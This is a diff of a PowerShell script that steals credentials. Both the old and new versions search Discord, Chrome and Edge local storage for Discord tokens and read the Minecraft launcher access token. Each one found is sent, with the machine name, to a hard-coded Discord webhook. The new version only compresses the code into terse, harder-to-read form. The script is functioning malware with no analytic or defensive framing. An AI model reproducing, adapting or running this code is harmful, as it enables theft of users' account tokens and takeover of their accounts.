@@ -1,42 +1,5 @@
-$webhookUrl = "https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
-
-function Send-Discord {
-    param($content)
-    $payload = @{ content = $content } | ConvertTo-Json
-    try {
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-$paths = @(
-    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\discordptb\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
-    "$env:APPDATA\.minecraft\launcher_profiles.json"
-)
-
-foreach ($path in $paths) {
-    if (Test-Path $path) {
-        if ($path -like "*.json") {
-            try {
-                $data = Get-Content $path -Raw | ConvertFrom-Json
-                if ($data.accessToken) { Send-Discord "**[MC TOKEN]**`n```$($data.accessToken)```" }
-            } catch {}
-        } else {
-            Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
-                $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                if ($content) {
-                    $matches = [regex]::Matches($content, '[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')
-                    foreach ($match in $matches) {
-                        Send-Discord "**[TOKEN]**`n```$($match.Value)```"
-                        Start-Sleep -Milliseconds 200
-                    }
-                }
-            }
-        }
-    }
-}
-
-Send-Discord "**[DONE]** $env:COMPUTERNAME"
+$w="https://discord.com/api/webhooks/1490629749159104532/wFu6BV4lrg8HHuNzi10Ii4pMXYkJx0_xDuk5NnOgVDoPvJqwAoPsesebgGKOIm2WZ6Oc"
+function d($c){$p=@{content=$c}|ConvertTo-Json;try{Invoke-RestMethod -Uri $w -Method Post -Body $p -ContentType "application/json" -ErrorAction SilentlyContinue}catch{}}
+$p=@("$env:LOCALAPPDATA\Discord\Local Storage\leveldb","$env:LOCALAPPDATA\discordcanary\Local Storage\leveldb","$env:LOCALAPPDATA\discordptb\Local Storage\leveldb","$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb","$env:APPDATA\.minecraft\launcher_profiles.json")
+foreach($l in $p){if(Test-Path $l){if($l-like"*.json"){try{$j=Get-Content $l -Raw|ConvertFrom-Json;if($j.accessToken){d("[MC]```$($j.accessToken)```")}}catch{}}else{Get-ChildItem "$l\*.ldb"|%{$c=Get-Content $_.FullName -Raw -ErrorAction 0;if($c){[regex]::Matches($c,'[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}')|%{d("[T]```$($_.Value)```");Start-Sleep -Milliseconds 200}}}}}}
+d("[D] $env:COMPUTERNAME")
